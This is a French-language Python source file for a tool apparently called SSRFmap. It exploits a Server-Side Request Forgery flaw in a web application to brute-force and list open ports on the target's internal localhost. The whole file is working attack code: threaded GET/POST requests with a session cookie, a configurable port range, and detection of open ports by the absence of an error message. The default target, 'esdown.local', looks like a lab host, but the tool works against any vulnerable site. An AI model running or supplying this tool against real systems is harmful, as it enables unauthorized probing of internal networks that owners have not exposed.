########################################################
###################### RESUME ##########################
########################################################


start = """
  ___ ___ ___ ___                
 / __/ __| _ \ __| __  __ _ _ __ 
 \__ \__ \   / _| '  \/ _` | '_ \\
 |___/___/_|_\_||_|_|_\__,_| .__/
                           |_|
bruteforce port open       par ben4444
"""

resume = "Outil de bruteforce de ports ouverts via une vulnérabilité SSRF"
description = """Cet outil permet d'exploiter une vulnérabilité SSRF (Server-Side Request Forgery) 
pour détecter les ports ouverts sur un serveur cible.
 
Il fonctionne en envoyant des requêtes HTTP (GET ou POST) vers une 
URL vulnérable en faisant varier le numéro de port. 
L'outil analyse ensuite les réponses du serveur pour détecter les 
ports ouverts en se basant sur les messages d'erreur retournés.
 
Fonctionnalités principales :
- Support des méthodes GET et POST
- Gestion des cookies de session
- Gestion du multi-threading pour des scans plus rapides
- Plage de ports configurable
- Sauvegarde de la configuration
- Affichage en temps réel de la progression
- Estimation du temps restant"""

########################################################
###################### CONFIG ##########################
########################################################

METHODE_HTTP_DEFAULT = "GET"
URL_DEFAULT = "http://esdown.local/appli.php?url=http://localhost:"
DATA_HTTP_DEFAULT = ""
ERREUR_DEFAULT = "Connection failed"
COOKIE_PHPSESSID_DEFAULT = "5b7fddd0fca63a3e7856855502028a24"
PORT_START_DEFAULT = 1
PORT_STOP_DEFAULT = 65554
THREADS_DEFAULT = 20



########################################################
###################### IMPORT ##########################
########################################################

import requests
import curses
import time
import concurrent.futures
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry # type: ignore
import signal
import threading
from colorama import init, Fore, Back, Style
import os


########################################################
###################### FONCTIONS #######################
########################################################

# Initialiser colorama
init()

def afficher_barre_progression(stdscr, pourcentage, port_actuel, debut_temps):
    hauteur, largeur = stdscr.getmaxyx()
    longueur_barre = largeur - 20  # Réduire la longueur de la barre pour laisser de la place au port
    remplissage = int(longueur_barre * pourcentage / 100)
    barre = '█' * remplissage + '░' * (longueur_barre - remplissage)
    stdscr.attron(curses.color_pair(3))
    
    temps_ecoule = time.time() - debut_temps
    if temps_ecoule > 10:
        temps_estime = (temps_ecoule / pourcentage) * (100 - pourcentage) if pourcentage > 0 else 0
        minutes = int(temps_estime // 60)
        secondes = int(temps_estime % 60)
        if temps_ecoule % 1.2 < 0.1:
            stdscr.addstr(hauteur - 2, 0, f"Temps restant estimé: {minutes:02d}m {secondes:02d}s")
    
    stdscr.addstr(hauteur - 3, 0, f"Port actuel: {port_actuel}")
    stdscr.addstr(hauteur - 1, 0, f"[{barre}] {pourcentage:.1f}%")
    stdscr.attroff(curses.color_pair(3))
    stdscr.refresh()

def verifier_port(port, stop_event, URL, ERREUR, COOKIE, METHODE_HTTP, DATA_HTTP):
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.1)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    try:
        if stop_event.is_set():
            return None
        if METHODE_HTTP == "GET":
            response = session.get(f"{URL}{port}", cookies=COOKIE, timeout=5, allow_redirects=False)
            if response.is_redirect:
                raise Exception("Requete Redirect - Bad Config cookie / url / methode - Appuyer sur une touche pour quitter")
            if response.status_code == 404:
                raise Exception("Requete 404 not found - Bad Config url - Appuyer sur une touche pour quitter")
            if ERREUR not in response.text:
                return port
        elif METHODE_HTTP == "POST":
            payload = DATA_HTTP.replace("<port>", str(port))
            response = session.post(URL, data=payload, cookies=COOKIE, timeout=5, allow_redirects=False)
            if response.is_redirect:
                raise Exception("Requete Redirect - Bad Config cookie / url / methode - Appuyer sur une touche pour quitter")
            if response.status_code == 404:
                raise Exception("Requete 404 not found - Bad Config url - Appuyer sur une touche pour quitter")
            if ERREUR not in response.text:
                return port
    except requests.exceptions.ConnectionError:
        raise Exception("Requete non aboutit - Bad config domaine invalide - Appuyer sur une touche pour quitter")
    except requests.RequestException:
        pass
    finally:
        session.close()
    return None

def start_scan(stdscr, URL, ERREUR, COOKIE, PLAGE_PORTS, THREADS, debut, fin, METHODE_HTTP, DATA_HTTP):
    debut_temps = time.time()
    curses.curs_set(0)
    stdscr.clear()
    
    # Initialisation des couleurs
    curses.start_color()
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)  # Pour les infos
    curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_RED)  # Pour les ports ouverts
    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)  # Pour la barre de progression
    curses.init_pair(4, curses.COLOR_GREEN, curses.COLOR_BLACK)  # Pour l'ASCII art

    # Afficher l'ASCII art
    stdscr.attron(curses.color_pair(4))
    for i, line in enumerate(start.split('\n')):
        stdscr.addstr(i, 0, line)
    stdscr.attroff(curses.color_pair(4))

    # Afficher les informations dans l'en-tête
    start_y = len(start.split('\n')) + 1
    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(start_y, 0, f"URL: {URL}<port>")
    stdscr.addstr(start_y + 1, 0, f"ERREUR: {ERREUR}")
    stdscr.addstr(start_y + 2, 0, f"COOKIE: {COOKIE}")
    stdscr.addstr(start_y + 3, 0, f"PLAGE_PORTS: {debut} - {fin}")
    stdscr.addstr(start_y + 4, 0, f"THREADS: {THREADS}")
    stdscr.addstr(start_y + 5, 0, f"METHODE_HTTP: {METHODE_HTTP}")
    if METHODE_HTTP == "POST":
        stdscr.addstr(start_y + 6, 0, f"DATA_HTTP: {DATA_HTTP}")
    stdscr.attroff(curses.color_pair(1))
    stdscr.addstr(start_y + 8, 0, "Ports ouverts:")

    total_ports = len(PLAGE_PORTS)
    ports_ouverts = []

    stop_event = threading.Event()

    def signal_handler(signum, frame):
        stop_event.set()
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, signal_handler)

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(verifier_port, port, stop_event, URL, ERREUR, COOKIE, METHODE_HTTP, DATA_HTTP): port for port in PLAGE_PORTS}
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                if stop_event.is_set():
                    break
                port = futures[future]
                try:
                    result = future.result()
                    if result:
                        ports_ouverts.append(result)
                        stdscr.attron(curses.color_pair(2))
                        stdscr.addstr(len(ports_ouverts) + start_y + 8, 0, f"Port {result} ouvert : {URL}{result}")
                        stdscr.attroff(curses.color_pair(2))
                except Exception as e:
                    stop_event.set()
                    stdscr.attron(curses.color_pair(2))
                    stdscr.addstr(start_y + 8, 0, str(e))
                    stdscr.attroff(curses.color_pair(2))
                    stdscr.refresh()
                    stdscr.getch()
                    return [], time.time() - debut_temps

                pourcentage = (i + 1) / total_ports * 100
                afficher_barre_progression(stdscr, pourcentage, port, debut_temps)

                stdscr.refresh()

        fin_temps = time.time()
        temps_execution = fin_temps - debut_temps
        minutes = int(temps_execution // 60)
        secondes = int(temps_execution % 60)
        stdscr.addstr(len(ports_ouverts) + start_y + 10, 0, f"Scan terminé en {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
        stdscr.refresh()
        stdscr.getch()
    except curses.error:
        stop_event.set()
        executor.shutdown(wait=False)
        fin_temps = time.time()
        temps_execution = fin_temps - debut_temps
        minutes = int(temps_execution // 60)
        secondes = int(temps_execution % 60)
        stdscr.addstr(len(ports_ouverts) + start_y + 10, 0, f"Scan interrompu après {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
        stdscr.refresh()
        stdscr.getch()
        pass  # Ignorer les erreurs de curses (comme l'écriture hors de l'écran)
    except KeyboardInterrupt:
        try:
            stop_event.set()
            executor.shutdown(wait=False)
            fin_temps = time.time()
            temps_execution = fin_temps - debut_temps
            minutes = int(temps_execution // 60)
            secondes = int(temps_execution % 60)
            stdscr.addstr(len(ports_ouverts) + start_y + 10, 0, f"Scan interrompu après {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
            stdscr.refresh()
            stdscr.getch()
        except KeyboardInterrupt:
            stop_event.set()
            executor.shutdown(wait=False)
            fin_temps = time.time()
            temps_execution = fin_temps - debut_temps
            minutes = int(temps_execution // 60)
            secondes = int(temps_execution % 60)
            stdscr.addstr(len(ports_ouverts) + start_y + 10, 0, f"Scan interrompu après {minutes} minutes et {secondes} secondes. Appuyez sur une touche pour quitter.")
            stdscr.refresh()
            stdscr.getch()

    return ports_ouverts, temps_execution

def sauvegarder_config(URL, METHODE_HTTP, ERREUR, COOKIE_PHPSESSID, debut, fin, THREADS, DATA_HTTP):
    with open(__file__, 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.startswith('URL_DEFAULT'):
            lines[i] = f'URL_DEFAULT = "{URL}"\n'
        elif line.startswith('METHODE_HTTP_DEFAULT'):
            lines[i] = f'METHODE_HTTP_DEFAULT = "{METHODE_HTTP}"\n'
        elif line.startswith('ERREUR_DEFAULT'):
            lines[i] = f'ERREUR_DEFAULT = "{ERREUR}"\n'
        elif line.startswith('COOKIE_PHPSESSID_DEFAULT'):
            lines[i] = f'COOKIE_PHPSESSID_DEFAULT = "{COOKIE_PHPSESSID}"\n'
        elif line.startswith('PORT_START_DEFAULT'):
            lines[i] = f'PORT_START_DEFAULT = {debut}\n'
        elif line.startswith('PORT_STOP_DEFAULT'):
            lines[i] = f'PORT_STOP_DEFAULT = {fin}\n'
        elif line.startswith('THREADS_DEFAULT'):
            lines[i] = f'THREADS_DEFAULT = {THREADS}\n'
        elif line.startswith('DATA_HTTP_DEFAULT'):
            lines[i] = f'DATA_HTTP_DEFAULT = "{DATA_HTTP}"\n'

    with open(__file__, 'w') as file:
        file.writelines(lines)

# Demander à l'utilisateur de saisir les variables
def demander_config():
    print("Config par defaut :")
    URL = URL_DEFAULT
    ERREUR = ERREUR_DEFAULT
    COOKIE_PHPSESSID = COOKIE_PHPSESSID_DEFAULT
    COOKIE = {"PHPSESSID": COOKIE_PHPSESSID}
    debut = PORT_START_DEFAULT
    fin = PORT_STOP_DEFAULT
    PLAGE_PORTS = range(debut, fin + 1)
    THREADS = THREADS_DEFAULT
    METHODE_HTTP = METHODE_HTTP_DEFAULT
    DATA_HTTP = DATA_HTTP_DEFAULT
    print(Fore.CYAN + f"URL : {URL}<port>" + Style.RESET_ALL)
    print(Fore.CYAN + f"METHODE_HTTP : {METHODE_HTTP}" + Style.RESET_ALL)
    print(Fore.CYAN + f"ERREUR : {ERREUR}" + Style.RESET_ALL)
    print(Fore.CYAN + f"COOKIE : {COOKIE}" + Style.RESET_ALL)
    print(Fore.CYAN + f"PLAGE_PORTS : {debut}-{fin}" + Style.RESET_ALL)
    print(Fore.CYAN + f"THREADS : {THREADS}" + Style.RESET_ALL)
    print(Fore.CYAN + "----------------------------------------" + Style.RESET_ALL)

    config_modifiee = False
    if input("Utiliser la config du code ? (O/n) : ") == "n":
        URL = input(Fore.CYAN + f"Entrez l'URL ou par defaut : {URL_DEFAULT} : " + Style.RESET_ALL) or URL_DEFAULT
        if not URL.endswith(':'):
            URL += ':'

        METHODE_HTTP = input(Fore.CYAN + f"Entrez la méthode HTTP (GET/POST) ou par defaut : {METHODE_HTTP_DEFAULT} : " + Style.RESET_ALL) or METHODE_HTTP_DEFAULT
        if METHODE_HTTP == "POST":
            DATA_HTTP = input(Fore.CYAN + f"Entrez les données HTTP pour la méthode POST (utilisez <port> pour indiquer l'emplacement du port) : " + Style.RESET_ALL)
        ERREUR = input(Fore.CYAN + f"Entrez le message d'erreur ou par defaut : {ERREUR_DEFAULT} : " + Style.RESET_ALL) or ERREUR_DEFAULT
        COOKIE_PHPSESSID = input(Fore.CYAN + f"Entrez la valeur PHPSESSID du cookie ou par defaut : {COOKIE_PHPSESSID_DEFAULT} : " + Style.RESET_ALL) or COOKIE_PHPSESSID_DEFAULT
        COOKIE = {"PHPSESSID": COOKIE_PHPSESSID}
        debut = int(input(Fore.CYAN + f"Entrez le début de la plage de ports ou par defaut : {PORT_START_DEFAULT} : " + Style.RESET_ALL) or PORT_START_DEFAULT ) 
        fin = int(input(Fore.CYAN + f"Entrez la fin de la plage de ports ou par defaut : {PORT_STOP_DEFAULT} : " + Style.RESET_ALL) or PORT_STOP_DEFAULT ) 
        PLAGE_PORTS = range(debut, fin + 1)
        THREADS = int(input(Fore.CYAN + f"Entrez le nombre de threads ou par defaut : {THREADS_DEFAULT} (conseillé) : " + Style.RESET_ALL) or THREADS_DEFAULT)
        print(Fore.CYAN + "----------------------------------------" + Style.RESET_ALL)
        config_modifiee = True

    if config_modifiee:
        sauvegarder_config(URL, METHODE_HTTP, ERREUR, COOKIE_PHPSESSID, debut, fin, THREADS, DATA_HTTP)
        print(Fore.GREEN + "Configuration sauvegardée dans le code." + Style.RESET_ALL)
    
    return URL, ERREUR, COOKIE, PLAGE_PORTS, THREADS, debut, fin, METHODE_HTTP, DATA_HTTP

def main():
    try :
        URL, ERREUR, COOKIE, PLAGE_PORTS, THREADS, debut, fin, METHODE_HTTP, DATA_HTTP = demander_config()
        ports_ouverts, temps_execution = curses.wrapper(start_scan, URL, ERREUR, COOKIE, PLAGE_PORTS, THREADS, debut, fin, METHODE_HTTP, DATA_HTTP)
        minutes = int(temps_execution // 60)
        secondes = int(temps_execution % 60)
        print(Fore.YELLOW + f"\nTemps d'exécution : {minutes} minutes et {secondes} secondes" + Style.RESET_ALL)
        print(Fore.GREEN + "\nListe des ports ouverts :" + Style.RESET_ALL)
        for port in ports_ouverts:
            print(Fore.LIGHTYELLOW_EX + f"Port {port} ouvert : {URL}{port}" + Style.RESET_ALL)
    except KeyboardInterrupt:
        print(Fore.RED + "\nQuit" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
